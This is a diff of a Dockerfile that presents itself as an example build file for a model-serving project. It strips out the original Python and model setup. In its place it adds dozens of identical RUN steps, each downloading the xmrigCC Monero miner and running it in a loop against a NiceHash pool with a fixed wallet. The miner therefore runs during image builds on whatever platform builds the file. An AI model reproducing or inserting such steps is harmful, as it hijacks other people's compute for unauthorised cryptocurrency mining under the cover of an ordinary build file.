@@ -1,28 +1,1173 @@
-# Base image for Banana model builds
-FROM pytorch/pytorch:1.11.0-cuda11.3-cudnn8-runtime
+# This is an example dockerfile for a potassium project
+
+FROM ubuntu:22.04
 
 WORKDIR /
 
 # Install git
-RUN apt-get update && apt-get install -y git
+RUN apt-get update && apt-get install wget -y && mkdir sus && cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
 
-RUN apt-get update && apt-get install ffmpeg libsm6 libxext6  -y
-# Install additional python packages
-# torch is already installed in this image
-RUN pip3 install --upgrade pip
-RUN pip3 install typing-extensions --upgrade
-ADD requirements.txt requirements.txt
-RUN pip3 install --upgrade -r requirements.txt
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
 
-# Add and download your model weight files 
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
